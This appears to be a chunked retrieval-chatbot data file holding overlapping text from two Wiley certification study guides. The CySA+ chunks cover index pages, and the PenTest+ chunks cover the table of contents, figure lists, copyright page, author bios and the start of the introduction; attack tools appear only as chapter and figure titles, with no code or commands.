143 two-­factor authentication (2FA), 55 U UC Berkeley, 327–329 UK Centre for the Protection of National Infrastructure, 146 Ulbricht, Ross, 467–468 unauthorized access, 97–99 unauthorized changes, 97–99 unauthorized privilege use, 97–99 unauthorized software, 95–97 unexpected traffic spikes, 85–86 Unified Kill Chain, 366–367 unified threat management (UTF), as on-­premises network architecture, 48 U.S. Cybersecurity and Infrastructure Security Agency (CISA), 137 U.S. Department of Defense (DoD), 26, 137 USB device history, viewing, 470 USB Historian, 470 use, Generally Accepted Privacy Principles (GAPP) for, 6 user acceptance testing (UAT), 312, 324–325 user and entity behavior and analysis (UEBA), 121 user behavior analysis of, 121 unusual, 383–384 user interaction (UI) metric, 251 user stories, 316 V validating data integrity, 388–389, 410, 465, 468 hashing
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	467–468 unauthorized access, 97–99 unauthorized changes, 97–99 unauthorized privilege use, 97–99 unauthorized software, 95–97 unexpected traffic spikes, 85–86 Unified Kill Chain, 366–367 unified threat management (UTF), as on-­premises network architecture, 48 U.S. Cybersecurity and Infrastructure Security Agency (CISA), 137 U.S. Department of Defense (DoD), 26, 137 USB device history, viewing, 470 USB Historian, 470 use, Generally Accepted Privacy Principles (GAPP) for, 6 user acceptance testing (UAT), 312, 324–325 user and entity behavior and analysis (UEBA), 121 user behavior analysis of, 121 unusual, 383–384 user interaction (UI) metric, 251 user stories, 316 V validating data integrity, 388–389, 410, 465, 468 hashing and, 454–455 vulnerability scan results, 256–260 velocity tracking, 316 version control, 309 versions identifying, 168–169 outdated SSL/TLS, 270 viewing USB device history, 470 virtual desktop infrastructure (DI), 39 virtual local area network (VLAN), 50, 400–401 virtual machines (VMs), 70–71, 163 virtual private cloud (VPC), 49 virtual private network (VPN), 51 virtual segmentation, 50 virtualization, 39 virtualization forensics, 461 VirusShare, 138 VirusTotal, 120 Visa, 329–330 Volatility Framework, 456, 471 vulnerabilities about, 7, 294, 333 analyzing risk, 294–300 answers to review questions, 501–503 buffer overflows, 264–265 common, 260–293 critical, 429 defined, 294 deigning and coding for security, 319–321 end-­of-­life, 263–264 endpoint, 261–269 exam essentials, 333–334 identifying, 10 implementing security controls, 303–304 insecure design, 267–268 lab exercises, 334–335 managing computing environment, 307–310 managing risk, 300–303 network, 269–274 outdated components, 263–264 policies, governance, and service level objectives, 325–332 privilege escalation, 265–266 remediating, 287 remote code execution, 266–267 responding to, 293–339 review questions, 336–339 security misconfiguration, 268–269 server, 261–269 software assurance best practices, 310–318 software security testing, 321–325 threat classification, 305–307 web application, 276–281 vulnerability feeds, 218 vulnerability management metrics and KPIs, 428–429 reporting, 424–431, 441 vulnerability management programs about, 204, 238 answers to review questions, 497–499 assessment tools for, 228–237 configuring vulnerability scans, 213–221 developing remediation workflows, 221–226 vulnerability scans – Whois exam essentials, 238–239 executing vulnerability scans, 213–221 identifying requirements for, 204–212 lab exercises, 239–240 overcoming risks of vulnerability scanning, 227–228 review questions, 241–244 threat intelligence and, 142 vulnerability scans about, 247, 284 active, 212 analyzing, 245–291 answers to review questions, 499–500 common vulnerabilities, 260–283 configuring, 213–221 detecting, 86–87 exam essentials, 284–285 executing, 213–221 identifying targets, 209–210 infrastructure, 228–229 installing, 239–240 interpreting, 285 lab exercises, 285–287 maintenance for scanners, 218 passive, 212 reports, 247–256 review questions, 288–291 running, 240 scheduling, 210–212 scope of, 213–214 sensitivity levels of, 214–215 software for scanners, 219 validating results of, 256–260 W Waterfall methodology, 313 weaponization, 255, 364, 365 web, as threats, 357 web application firewalls (WAFs), 17, 108–109, 428 web application scanning, 233–235 web application vulnerabilities, 276–281 Web Services on Devices API (WSDAPI), 170 web shell, 280 webhooks, 29 websites Active Directory Federation Services (AD FS), 63 AlienVault’s Open Threat Exchange, 379 531 Australian Signals Directorate’s Cyber Security Centre, 138 CISA’s Automated Indicator Sharing (AIS) program, 137 CISA’s Information Sharing and Analysis Organizations (ISAOS) program, 137 Cisco’s threat security site, 137 Cuckoo Sandbox, 120 Diamond Model of Intrusion Analysis, 362 Domain Tools, 190 Domain-­Based Message Authentication, Reporting,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	results of, 256–260 W Waterfall methodology, 313 weaponization, 255, 364, 365 web, as threats, 357 web application firewalls (WAFs), 17, 108–109, 428 web application scanning, 233–235 web application vulnerabilities, 276–281 Web Services on Devices API (WSDAPI), 170 web shell, 280 webhooks, 29 websites Active Directory Federation Services (AD FS), 63 AlienVault’s Open Threat Exchange, 379 531 Australian Signals Directorate’s Cyber Security Centre, 138 CISA’s Automated Indicator Sharing (AIS) program, 137 CISA’s Information Sharing and Analysis Organizations (ISAOS) program, 137 Cisco’s threat security site, 137 Cuckoo Sandbox, 120 Diamond Model of Intrusion Analysis, 362 Domain Tools, 190 Domain-­Based Message Authentication, Reporting, and Conformance (DMARC), 118 Honeynet project, 151 Joe Sandbox, 120 Lockheed Martin’s Cyber Kill Chain, 366 Microsoft’s threat intelligence blog, 137 MISP Threat Sharing project, 137 MITRE’s ATT&CK Framework, 362 National Archives General Records, 351 National Council of ISACs, 145 National Institute of Standards and Technology (NIST) SP 800-­115, 161 NIST National Software Reference Library, 455 Open Source Security Testing Methodology Manual (OSSTMM), 161, 367 Open Web Application Security Project (OWASP), 367 The Open Threat Exchange, 137 Penetration Testing Execution Standard, 161 Ransomware Playbook, 353 SANS Internet Storm Center, 138 Senki.org, 137 Shared Assessments, 48 SP 800-­61 Computer Security Incident Handling Guide, 433 Spamhaus, 138 ThreatConnect rating system, 141 Threatfeeds.io, 137 UK’s Centre for the Protection of National Infrastructure, 146 Unified Kill Chain, 366 U.S. Cybersecurity and Infrastructure Security Agency (CISA), 137 U.S. Department of Defense (DoD), 137 VirusShare, 138 VirusTotal, 120 Whois, 112 well-­known ports, 166 Whois, 112–114, 184–190 532 Windows Registry – zone transfers Windows Registry about, 42–43 changes or anomalies in, 98 exploring, 71–72 Windows services, 102 Windows Update, 310 wiped drives, 449 wiped removable media, 449 wired rogues, 89 wireless rogues, 90 Wireshark, 111, 458–459 write blockers, 449, 468 X XML, 125–126 Z Zed Attack Proxy (ZAP), 235, 236 Zenmap, 162–163 zero trust, 52 zero-­day attacks/vulnerabilities, 260, 357–358, 429 zone transfers, 187–188 Get Certified! Security + CISSP CISM CySA + PenTest+ SSCP Data + CCSP CIPP/US 90 Days To Your Next Certification Mike Chapple offers FREE ONLINE STUDY GROUPS that complement this book and will help prepare you for your next technology certification. Visit CertMike.com to learn more! Online Test Bank To help you study for your CompTIA CySA+ certification exam, register to gain one year of FREE access after activation to the online interactive test bank—­ included with your purchase of this book! All of the chapter review questions and the practice tests in this book are included in the online test bank so you can practice in a timed and graded setting. Register and Access the Online Test Bank To register your book and get access to the online test bank, follow these steps: 1. Go to www.wiley.com/go/sybextestprep. You’ll see the “How to Register Your Book for Online Access” instructions. 2. Click “here to register” and then select your book from the list. 3. Complete the required registration information, including answering the security verification to prove book ownership. You will be emailed a pin
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the chapter review questions and the practice tests in this book are included in the online test bank so you can practice in a timed and graded setting. Register and Access the Online Test Bank To register your book and get access to the online test bank, follow these steps: 1. Go to www.wiley.com/go/sybextestprep. You’ll see the “How to Register Your Book for Online Access” instructions. 2. Click “here to register” and then select your book from the list. 3. Complete the required registration information, including answering the security verification to prove book ownership. You will be emailed a pin code. 4. Follow the directions in the email or go to www.wiley.com/go/sybextestprep. 5. Find your book on that page and click the “Register or Login” link with it. Then enter the pin code you received and click the “Activate PIN” button. 6. On the Create an Account or Login page, enter your username and password, and click Login or, if you don’t have an account already, create a new account. 7. At this point, you should be in the test bank site with your new test bank listed at the top of the page. If you do not see it there, please refresh the page or log out and log back in. WILEY END USER LICENSE AGREEMENT Go to www.wiley.com/go/eula to access Wiley’s ebook EULA.
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Table of Contents Cover Table of Contents Title Page Copyright Dedication Acknowledgments About the Authors About the Technical Editor Introduction CompTIA The PenTest+ Exam What Does This Book Cover? CompTIA PenTest+ Certification Exam Objectives How to Contact the Publisher Assessment Test Answers to Assessment Test Chapter 1: Penetration Testing What Is Penetration Testing? Reasons for Penetration Testing Who Performs Penetration Tests? The CompTIA Penetration Testing Process The Cyber Kill Chain Tools of the Trade Summary Exam Essentials Lab Exercises Chapter 2: Planning and Scoping Penetration Tests Summarizing Pre‐engagement Activities Shared Responsibility Model Key Legal Concepts for Penetration Tests Regulatory Compliance Considerations Penetration Testing Standards and Methodologies Threat Modeling Frameworks Summary Exam Essentials Lab Exercises Review Questions Chapter 3: Information Gathering Reconnaissance and Enumeration Active Reconnaissance and Enumeration Summary Exam Essentials Lab Exercises Review Questions Chapter 4: Vulnerability Scanning Identifying Vulnerability Management Requirements Configuring and Executing Vulnerability Scans Software Security Testing Developing a Remediation Workflow Overcoming Barriers to Vulnerability Scanning Summary Exam Essentials Lab Exercises Review Questions Chapter 5: Analyzing Vulnerability Scans Reviewing and Interpreting Scan Reports Validating Scan Results Common Vulnerabilities Summary Exam Essentials Lab Exercises Review Questions Chapter 6: Exploit and Pivot Exploits and Attacks Pivoting and Lateral Movement Exploitation Toolkits and Tools Exploit Specifics Leveraging Exploits Persistence and Evasion Covering Your Tracks Summary Exam Essentials Lab Exercises Review Questions Chapter 7: Exploiting Network Vulnerabilities Identifying Exploits Conducting Network Exploits Exploiting Windows Services Identifying and Exploiting Common Services Wireless Exploits Summary Exam Essentials Lab Exercises Review Questions Chapter 8: Exploiting Physical and Social Vulnerabilities Exploiting Physical Vulnerabilities Exploiting Social Vulnerabilities Summary Exam Essentials Lab Exercises Review Questions Chapter 9: Exploiting Application Vulnerabilities Exploiting Injection Vulnerabilities Exploiting Authentication Vulnerabilities Exploiting Authorization Vulnerabilities Exploiting Web Application Vulnerabilities Unsecure Coding Practices Application Testing Tools Summary Exam Essentials Lab Exercises Review Questions Chapter 10: Exploiting Host Vulnerabilities Attacking Hosts Credential Attacks and Testing Tools Remote Access Attacking Virtual Machines and Containers Attacking Cloud Technologies Attacking Mobile Devices Attacking Artificial Intelligence (AI) Attacking IoT, ICS, Embedded Systems, and SCADA Devices Attacking Data Storage Summary Exam Essentials Lab Exercises Review Questions Chapter 11: Reporting and Communication The Importance of Collaboration and Communication Recommending Mitigation Strategies Writing a Penetration Testing Report Wrapping Up the Engagement Summary Exam Essentials Lab Exercises Review Questions Chapter 12: Scripting for Penetration Testing Scripting and Penetration Testing Variables, Arrays, and Substitutions Comparison Operations String Operations Flow Control Input and Output (I/O) Error Handling Reusing Code The Role of Coding in Penetration Testing Summary Exam Essentials Lab Exercises Review Questions Appendix A: Answers to Review Questions Chapter 2: Planning and Scoping Penetration Tests Chapter 3: Information Gathering Chapter 4: Vulnerability Scanning Chapter 5: Analyzing Vulnerability Scans Chapter 6: Exploit and Pivot Chapter 7: Exploiting Network Vulnerabilities Chapter 8: Exploiting Physical and Social Vulnerabilities Chapter 9: Exploiting Application Vulnerabilities Chapter 10: Exploiting Host Vulnerabilities Chapter 11: Reporting and Communication Chapter 12: Scripting for Penetration Testing Appendix B: Solution to Lab Exercise Solution to Activity 5.2: Analyzing a CVSS Vector Index End User License
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Error Handling Reusing Code The Role of Coding in Penetration Testing Summary Exam Essentials Lab Exercises Review Questions Appendix A: Answers to Review Questions Chapter 2: Planning and Scoping Penetration Tests Chapter 3: Information Gathering Chapter 4: Vulnerability Scanning Chapter 5: Analyzing Vulnerability Scans Chapter 6: Exploit and Pivot Chapter 7: Exploiting Network Vulnerabilities Chapter 8: Exploiting Physical and Social Vulnerabilities Chapter 9: Exploiting Application Vulnerabilities Chapter 10: Exploiting Host Vulnerabilities Chapter 11: Reporting and Communication Chapter 12: Scripting for Penetration Testing Appendix B: Solution to Lab Exercise Solution to Activity 5.2: Analyzing a CVSS Vector Index End User License Agreement List of Tables Chapter 3 TABLE 3.1 Common ports and services Chapter 5 TABLE 5.1 CVSS attack vector metric TABLE 5.2 CVSS attack complexity metric TABLE 5.3 CVSS attack requirements metric TABLE 5.4 CVSS privileges required metric TABLE 5.5 CVSS user interaction metric TABLE 5.6 CVSS confidentiality metrics TABLE 5.7 CVSS integrity metrics TABLE 5.8 CVSS availability metrics TABLE 5.9 CVSS Qualitative Severity Rating Scale Chapter 6 TABLE 6.1 Metasploit exploit quality ratings TABLE 6.2 Metasploit search terms List of Illustrations Chapter 1 FIGURE 1.1 The CIA triad FIGURE 1.2 The DAD triad FIGURE 1.3 CompTIA penetration testing stages FIGURE 1.4 The Cyber Kill Chain framework Chapter 2 FIGURE 2.1 A logical dataflow diagram FIGURE 2.2 Microsoft Shared Responsibility Matrix Chapter 3 FIGURE 3.1 nslookup for Netflix.com FIGURE 3.2 WHOIS of 52.41.111.100 FIGURE 3.3 tracert of Netflix.com FIGURE 3.4 Shodan result from an exposed Cisco device FIGURE 3.5 Censys IOS host view FIGURE 3.6 A Google search for passwords.xls FIGURE 3.7 Zenmap topology view FIGURE 3.8 Scapy packet crafting for a TCP ping FIGURE 3.9 ARP query and response FIGURE 3.10 Nmap scan using OS identification FIGURE 3.11 Nmap output of a Windows 10 system FIGURE 3.12 Harvesting emails using Metasploit FIGURE 3.13 Using the Wayback Machine FIGURE 3.14 Using recon‐ng FIGURE 3.15 Using Censys.io FIGURE 3.16 Using DNSDumpster FIGURE 3.17 Mapping the attack surface FIGURE 3.18 Using theHarvester FIGURE 3.19 Using WiGLE.net FIGURE 3.20 Using OSINT Framework Chapter 4 FIGURE 4.1 FIPS 199 Standards FIGURE 4.2 Qualys asset map FIGURE 4.3 Configuring a Nessus scan FIGURE 4.4 Sample Nessus scan report FIGURE 4.5 Nessus scan templates FIGURE 4.6 Disabling unused plug‐ins FIGURE 4.7 Configuring authenticated scanning FIGURE 4.8 Choosing a scan appliance FIGURE 4.9 National Cyber Awareness System Vulnerability Summary FIGURE 4.10 Setting automatic updates in Nessus FIGURE 4.11 Acunetix web application scan vulnerability report FIGURE 4.12 Nikto web application scan results FIGURE 4.13 Nessus web application scanner FIGURE 4.14 Vulnerability management life cycle FIGURE 4.15 Qualys scan performance settings Chapter 5 FIGURE 5.1 Nessus vulnerability scan report FIGURE 5.2 Qualys vulnerability scan report FIGURE 5.3 OpenVAS vulnerability scan report FIGURE 5.4 CVSS 4.0 Calculator FIGURE 5.5 Scan report showing vulnerabilities and best practices FIGURE 5.6 Vulnerability trend analysis FIGURE 5.7 Missing patch vulnerability FIGURE 5.8 Unsupported operating system vulnerability FIGURE 5.9 Code execution vulnerability FIGURE 5.10 FTP cleartext authentication vulnerability FIGURE 5.11 Debug mode vulnerability FIGURE 5.12
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	4.11 Acunetix web application scan vulnerability report FIGURE 4.12 Nikto web application scan results FIGURE 4.13 Nessus web application scanner FIGURE 4.14 Vulnerability management life cycle FIGURE 4.15 Qualys scan performance settings Chapter 5 FIGURE 5.1 Nessus vulnerability scan report FIGURE 5.2 Qualys vulnerability scan report FIGURE 5.3 OpenVAS vulnerability scan report FIGURE 5.4 CVSS 4.0 Calculator FIGURE 5.5 Scan report showing vulnerabilities and best practices FIGURE 5.6 Vulnerability trend analysis FIGURE 5.7 Missing patch vulnerability FIGURE 5.8 Unsupported operating system vulnerability FIGURE 5.9 Code execution vulnerability FIGURE 5.10 FTP cleartext authentication vulnerability FIGURE 5.11 Debug mode vulnerability FIGURE 5.12 Outdated SSL version vulnerability FIGURE 5.13 Insecure SSL cipher vulnerability FIGURE 5.14 Invalid certificate warning FIGURE 5.15 DNS amplification vulnerability FIGURE 5.16 Internal IP disclosure vulnerability FIGURE 5.17 Inside a virtual host FIGURE 5.18 SQL injection vulnerability FIGURE 5.19 Cross‐site scripting vulnerability Chapter 6 FIGURE 6.1 OpenVAS/Greenbone vulnerability report FIGURE 6.2 Pivoting FIGURE 6.3 Distributed Ruby vulnerability FIGURE 6.4 phpinfo() output accessible FIGURE 6.5 phpinfo.php output FIGURE 6.6 The Metasploit console FIGURE 6.7 Running show exploits in Metasploit FIGURE 6.8 Selecting an exploit FIGURE 6.9 Setting module options FIGURE 6.10 Successful exploit FIGURE 6.11 Using the command prompt FIGURE 6.12 WMImplant WMI tools FIGURE 6.13 CrackMapExec's main screen FIGURE 6.14 Responder capture flow FIGURE 6.15 Pass‐the‐hash flow FIGURE 6.16 John the Ripper Chapter 7 FIGURE 7.1 Double‐tagged Ethernet packet FIGURE 7.2 Yersinia 802.1q attack selection FIGURE 7.3 DNS cache poisoning attack FIGURE 7.4 ARP spoofing FIGURE 7.5 Manually configuring a MAC address in Windows 10 FIGURE 7.6 Metasploit SYN flood FIGURE 7.7 NetBIOS name service attack FIGURE 7.8 Responder sending poisoned answers FIGURE 7.9 Responder capturing hashes FIGURE 7.10 Output from snmpwalk FIGURE 7.11 THC Hydra SSH brute‐force attack FIGURE 7.12 WiGLE map showing access point density in a metropolitan area FIGURE 7.13 RFID cloner and tags Chapter 8 FIGURE 8.1 A typical security vestibule design FIGURE 8.2 SET menu FIGURE 8.3 SET loading the Metasploit reverse TCP handler FIGURE 8.4 BeEF hooked browser detail FIGURE 8.5 BeEF commands usable in a hooked browser Chapter 9 FIGURE 9.1 Web application firewall FIGURE 9.2 Account number input page FIGURE 9.3 Account information page FIGURE 9.4 Account information page after blind SQL injection FIGURE 9.5 Account creation page FIGURE 9.6 Zyxel router default password FIGURE 9.7 Session authentication with cookies FIGURE 9.8 Session cookie from CNN.com FIGURE 9.9 Session hijacking with cookies FIGURE 9.10 Kerberos authentication process FIGURE 9.11 Example web server directory structure FIGURE 9.12 Directory scanning with DirBuster FIGURE 9.13 Message board post rendered in a browser FIGURE 9.14 XSS attack rendered in a browser FIGURE 9.15 SQL error disclosure FIGURE 9.16 Zed Attack Proxy (ZAP) FIGURE 9.17 Burp Proxy FIGURE 9.18 Postman FIGURE 9.19 Wfuzz performing fuzz testing FIGURE 9.20 Gobuster DNS enumeration FIGURE 9.21 WPScan WordPress vulnerability scanner FIGURE 9.22 Scanning a database‐backed application with sqlmap Chapter 10 FIGURE 10.1 SUID files in Kali FIGURE 10.2 SUID files with details FIGURE 10.3 Abusing sudo rights FIGURE 10.4 Checking
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	FIGURE 9.10 Kerberos authentication process FIGURE 9.11 Example web server directory structure FIGURE 9.12 Directory scanning with DirBuster FIGURE 9.13 Message board post rendered in a browser FIGURE 9.14 XSS attack rendered in a browser FIGURE 9.15 SQL error disclosure FIGURE 9.16 Zed Attack Proxy (ZAP) FIGURE 9.17 Burp Proxy FIGURE 9.18 Postman FIGURE 9.19 Wfuzz performing fuzz testing FIGURE 9.20 Gobuster DNS enumeration FIGURE 9.21 WPScan WordPress vulnerability scanner FIGURE 9.22 Scanning a database‐backed application with sqlmap Chapter 10 FIGURE 10.1 SUID files in Kali FIGURE 10.2 SUID files with details FIGURE 10.3 Abusing sudo rights FIGURE 10.4 Checking Linux kernel version information FIGURE 10.5 Dumping the Windows SAM with Mimikatz FIGURE 10.6 Hashcat cracking Linux passwords FIGURE 10.7 Metasploit reverse TCP shell FIGURE 10.8 Detecting virtualization on a Windows system FIGURE 10.9 Detecting virtualization on Kali Linux FIGURE 10.10 Side‐channel attack against a virtual machine FIGURE 10.11 A simple SCADA environment design example Chapter 11 FIGURE 11.1 Smartphone‐based multifactor authentication Chapter 12 FIGURE 12.1 Identifying the language of a conditional execution statement FIGURE 12.2 Identifying the language of a for loop FIGURE 12.3 Identifying the language of a while loop CompTIA® PenTest+® Study Guide Exam PT0‐003 Third Edition Mike Chapple Robert Shimonski David Seidl Copyright © 2025 by John Wiley & Sons, Inc. All rights, including for text and data mining, AI training, and similar technologies, are reserved. Published by John Wiley & Sons, Inc., Hoboken, New Jersey. Published simultaneously in Canada and the United Kingdom. ISBNs: 9781394285006 (paperback), 9781394285020 (ePDF), 9781394285013 (ePub) No part of this publication may be reproduced, stored in a retrieval system, or transmitted in any form or by any means, electronic, mechanical, photocopying, recording, scanning, or otherwise, except as permitted under Section 107 or 108 of the 1976 United States Copyright Act, without either the prior written permission of the Publisher, or authorization through payment of the appropriate per‐copy fee to the Copyright Clearance Center, Inc., 222 Rosewood Drive, Danvers, MA 01923, (978) 750‐8400, fax (978) 750‐4470, or on the web at www.copyright.com. Requests to the Publisher for permission should be addressed to the Permissions Department, John Wiley & Sons, Inc., 111 River Street, Hoboken, NJ 07030, (201) 748‐6011, fax (201) 748‐6008, or online at www.wiley.com/go/permission. The manufacturer’s authorized representative according to the EU General Product Safety Regulation is Wiley‐VCH GmbH, Boschstr. 12, 69469 Weinheim, Germany, e‐mail: Product_Safety@wiley.com. Trademarks: WILEY, the Wiley logo, and Sybex are trademarks or registered trademarks of John Wiley & Sons, Inc. and/or its affiliates, in the United States and other countries, and may not be used without written permission. CompTIA and PenTest+ are trademarks or registered trademarks of The Computing Technology Industry Association, Inc. All other trademarks are the property of their respective owners. John Wiley & Sons, Inc. is not associated with any product or vendor mentioned in this book. Limit of Liability/Disclaimer of Warranty: While the publisher and authors have used their best efforts in preparing this book, they make no representations or warranties with respect
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	and Sybex are trademarks or registered trademarks of John Wiley & Sons, Inc. and/or its affiliates, in the United States and other countries, and may not be used without written permission. CompTIA and PenTest+ are trademarks or registered trademarks of The Computing Technology Industry Association, Inc. All other trademarks are the property of their respective owners. John Wiley & Sons, Inc. is not associated with any product or vendor mentioned in this book. Limit of Liability/Disclaimer of Warranty: While the publisher and authors have used their best efforts in preparing this book, they make no representations or warranties with respect to the accuracy or completeness of the contents of this book and specifically disclaim any implied warranties of merchantability or fitness for a particular purpose. No warranty may be created or extended by sales representatives or written sales materials. The advice and strategies contained herein may not be suitable for your situation. You should consult with a professional where appropriate. Further, readers should be aware that websites listed in this work may have changed or disappeared between when this work was written and when it is read. Neither the publisher nor authors shall be liable for any loss of profit or any other commercial damages, including but not limited to special, incidental, consequential, or other damages. For general information on our other products and services, please contact our Customer Care Department within the United States at (800) 762‐2974, outside the United States at (317) 572‐ 3993. For product technical support, you can find answers to frequently asked questions or reach us via live chat at https://sybexsupport.wiley.com. Wiley also publishes its books in a variety of electronic formats. Some content that appears in print may not be available in electronic formats. For more information about Wiley products, visit our web site at www.wiley.com. Library of Congress Control Number: 2025930423 Cover image: © Jeremy Woodhouse/Getty Images Cover design: Wiley This book is dedicated to Shahla Pirnia, in deepest gratitude for your unwavering dedication and meticulous care, which have shaped so many of my works. Your attention to detail and passion for excellence will always inspire me. May your legacy live on in every word we've crafted together. — Mike Acknowledgments Books like this involve work from many people, and as authors, we truly appreciate the hard work and dedication that the team at Wiley shows. We would especially like to thank Senior Acquisitions Editor Kenyon Brown. We have worked with Ken on multiple projects and consistently enjoy our work with him. We also greatly appreciated the editing and production team for the book, including Pete Gaughan, managing editor, who made sure everything worked smoothly; Christine O'Connor, our project manager, whose prompt and consistent oversight got this book out the door; and Saravanan Dakshinamurthy, our content refinement specialist, who guided us through layouts, formatting, and final cleanup to produce a great book. We'd also like to thank our technical editor, Rishalin Pillay, who provided us with thought‐provoking questions and technical insight throughout the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Acquisitions Editor Kenyon Brown. We have worked with Ken on multiple projects and consistently enjoy our work with him. We also greatly appreciated the editing and production team for the book, including Pete Gaughan, managing editor, who made sure everything worked smoothly; Christine O'Connor, our project manager, whose prompt and consistent oversight got this book out the door; and Saravanan Dakshinamurthy, our content refinement specialist, who guided us through layouts, formatting, and final cleanup to produce a great book. We'd also like to thank our technical editor, Rishalin Pillay, who provided us with thought‐provoking questions and technical insight throughout the process. We would also like to thank the many behind‐the‐scenes contributors, including the graphics, production, and technical teams who make the book and companion materials into a finished product. Our agent, Carole Jelen of Waterside Productions, continues to provide us with wonderful opportunities, advice, and assistance throughout our writing careers. Finally, we would like to thank our families, friends, and significant others who support us through the late evenings, busy weekends, and long hours that a book like this requires to write, edit, and get to press. About the Authors Mike Chapple, PhD, Security+, CISSP, CISA, PenTest+, CySA+, is a teaching professor of IT, analytics, and operations at the University of Notre Dame. He is also the academic director of the University's master's program in business analytics. Mike is a cybersecurity professional with over 25 years of experience in the field. Prior to his current role, Mike served as senior director for IT service delivery at Notre Dame, where he oversaw the university's cybersecurity program, cloud computing efforts, and other areas. Mike also previously served as chief information officer of Brand Institute and as an information security researcher with the National Security Agency and the U.S. Air Force. Mike is a frequent contributor to several magazines and websites and is the author or coauthor of more than 50 books, including CISSP Official ISC2 Study Guide (Wiley, 2024), CISSP Official ISC2 Practice Tests (Wiley, 2024), CompTIA Security+ Study Guide (Wiley, 2023), CompTIA CySA+ Study Guide (Wiley, 2023), CompTIA CySA+ Practice Tests (Wiley, 2023), and Cybersecurity: Information Operations in a Connected World (Jones and Bartlett, 2021). Mike offers free study groups for the PenTest+, CySA+, Security+, CISSP, and other major certifications at his website, http://certmike.com. Robert Shimonski, CASP+, CySA+, PenTest+, Security+, is a technology executive specializing in health care IT for one of the largest health systems in America. In his current role, Rob is responsible for bringing operational support and incident response into the future with the help of new technologies such as cloud and artificial intelligence. His current focus is on deploying securely to Cloud (Azure, AWS, and Google), DevOps, DevSecOps and AIOps. Rob has spent over 25 years in the technology “trenches” handling networking and security architecture, design, engineering, testing, and development efforts for global projects. A go‐to person for all things security‐related, Rob has been a major force in deploying security‐related systems for many years. Rob also worked
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	of the largest health systems in America. In his current role, Rob is responsible for bringing operational support and incident response into the future with the help of new technologies such as cloud and artificial intelligence. His current focus is on deploying securely to Cloud (Azure, AWS, and Google), DevOps, DevSecOps and AIOps. Rob has spent over 25 years in the technology “trenches” handling networking and security architecture, design, engineering, testing, and development efforts for global projects. A go‐to person for all things security‐related, Rob has been a major force in deploying security‐related systems for many years. Rob also worked for various companies reviewing and developing curriculum as well as other security‐related books, technical articles, and publications based on technology deployment, testing, hacking, pen testing, and many other aspects of security. Rob holds dozens of technology certifications to include 20+ CompTIA certifications, SANS.org GIAC, GSEC, and GCIH as well as many vendor‐based cloud specialized certifications from Google, Microsoft Azure, and Amazon Web Services. Rob is considered a leading expert in prepping others to achieve certification success. David Seidl, CISSP, PenTest+, is vice president for information technology and CIO at Miami University. During his IT career, he has served in a variety of technical and information security roles, including serving as the senior director for campus technology services at the University of Notre Dame, where he co‐led Notre Dame's move to the cloud and oversaw cloud operations, ERP, databases, identity management, and a broad range of other technologies and services. He also served as Notre Dame's director of information security and led Notre Dame's information security program. He has taught information security and networking undergraduate courses as an instructor for Notre Dame's Mendoza College of Business, and he has written books on security certification and cyberwarfare, including co‐ authoring the previous editions of CISSP (ISC) 2 Official Practice Tests (Sybex, 2018) as well as CISSP Official (ISC) 2 Practice Tests (Wiley, 2021), CompTIA Security+ Study Guide (Wiley, 2020), CompTIA Security+ Practice Tests (Wiley, 2020), CompTIA CySA+ Study Guide (Wiley, 2020), CompTIA CySA+ Practice Tests (Wiley, 2020), and Cybersecurity: Information Operations in a Connected World (Jones and Bartlett, 2021), and CompTIA Security+ Practice Tests: Exam SY0‐601 (Sybex, 2021), as well as other certification guides and books on information security. David holds a bachelor's degree in communication technology and a master's degree in information security from Eastern Michigan University, as well as CISSP, CySA+, PenTest+, GPEN, and GCIH certifications. About the Technical Editor Rishalin Pillay is a seasoned cybersecurity expert with extensive experience in offensive security, cloud security, threat, and incident response, and is recognized as a trusted authority in the field. As an accomplished Pluralsight author, he has created in‐depth courses like Red Team Tools and Threat Protection, and has authored or coauthored influential books such as Learn Penetration Testing (Packt Publishing, 2019), Ethical Hacking Workshop (Packt Publishing, 2023), and Offensive Shellcode from Scratch (Packt Publishing, 2022). Additionally, Rishalin has contributed to numerous publications on topics including dark web analysis, Kali Linux,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	CySA+, PenTest+, GPEN, and GCIH certifications. About the Technical Editor Rishalin Pillay is a seasoned cybersecurity expert with extensive experience in offensive security, cloud security, threat, and incident response, and is recognized as a trusted authority in the field. As an accomplished Pluralsight author, he has created in‐depth courses like Red Team Tools and Threat Protection, and has authored or coauthored influential books such as Learn Penetration Testing (Packt Publishing, 2019), Ethical Hacking Workshop (Packt Publishing, 2023), and Offensive Shellcode from Scratch (Packt Publishing, 2022). Additionally, Rishalin has contributed to numerous publications on topics including dark web analysis, Kali Linux, security operations, and essential study guides for networking and Microsoft technologies. His dedication to advancing the field has earned him prestigious accolades, including the Microsoft Content Publisher Gold and Platinum awards and the Event Speaker Gold award, reflecting his impactful presence as a writer, educator, and Tier‐1 business event speaker. Whether through writing, teaching, or presenting, Rishalin continues to make a lasting impact on the cybersecurity industry. Introduction The CompTIA® PenTest+® Study Guide: Exam PT0‐003, Third Edition, provides accessible explanations and real‐world knowledge about the exam objectives that make up the PenTest+ certification. This book will help you to assess your knowledge before taking the exam, as well as provide a stepping‐stone to further learning in areas where you may want to expand your skill set or expertise. Before you tackle the PenTest+ exam, you should already be a security practitioner. CompTIA suggests that test‐takers should have intermediate‐ level skills based on their cybersecurity pathway. You should also be familiar with at least some of the tools and techniques described in this book. You don't need to know every tool, but understanding how to use existing experience to approach a new scenario, tool, or technology that you may not know is critical to passing the PenTest+ exam. CompTIA CompTIA is a nonprofit trade organization that offers certification in a variety of IT areas, ranging from the skills that a PC support technician needs, which are covered in the A+ exam, to advanced certifications like the SecurityX, certification. CompTIA divides its exams into categories based on what topics it covers, as shown in the following table: Core Infrastructure Cybersecurity Tech+ 